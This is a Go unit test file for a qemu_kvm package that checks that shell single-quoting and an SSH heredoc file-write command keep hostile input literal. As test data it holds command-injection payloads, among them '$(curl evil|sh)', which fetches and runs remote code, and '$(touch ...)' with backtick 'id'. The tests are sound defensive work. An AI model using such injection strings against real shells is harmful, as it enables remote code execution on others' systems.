// Copyright 2019 Yunion
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package qemu_kvm

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

func TestSingleQuote(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", "''"},
		{"simple", "'simple'"},
		{"a b", "'a b'"},
		{"it's", `'it'\''s'`},
		{"$(curl evil|sh)", "'$(curl evil|sh)'"},
	}
	for _, c := range cases {
		if got := singleQuote(c.in); got != c.want {
			t.Errorf("singleQuote(%q) = %q, want %q", c.in, got, c.want)
		}
	}

	// end-to-end: the quoted value must reach the shell as one literal word
	payload := "$(touch /tmp/qemu_kvm_pwn) `id` ; it's"
	cmdStr := "printf %s " + singleQuote(payload)
	out, err := exec.Command("bash", "-c", cmdStr).Output()
	if err != nil {
		t.Fatalf("run quoted value: %v", err)
	}
	if string(out) != payload {
		t.Fatalf("quoted value not literal, output %q", string(out))
	}
	if _, err := os.Stat("/tmp/qemu_kvm_pwn"); !os.IsNotExist(err) {
		t.Fatalf("injection payload was executed")
	}
}

// malicious content written via the heredoc command must stay literal data
// and must not be evaluated by the remote shell
func TestBuildSshFilePutContentCmdInjectionSafe(t *testing.T) {
	dir := t.TempDir()
	filePath := filepath.Join(dir, "params.json")
	payloadFile := filepath.Join(dir, "pwn")
	content := `{"content":"$(touch ` + payloadFile + `) ` + "`id`" + ` $HOME"}`
	cmdStr := buildSshFilePutContentCmd(filePath, content)
	if err := exec.Command("bash", "-c", cmdStr).Run(); err != nil {
		t.Fatalf("run heredoc command: %v", err)
	}
	got, err := os.ReadFile(filePath)
	if err != nil {
		t.Fatalf("read written file: %v", err)
	}
	// the heredoc always appends the newline terminating the last content line
	if string(got) != content+"\n" {
		t.Fatalf("content not literal, got %q", string(got))
	}
	if _, err := os.Stat(payloadFile); !os.IsNotExist(err) {
		t.Fatalf("injection payload was executed")
	}
}
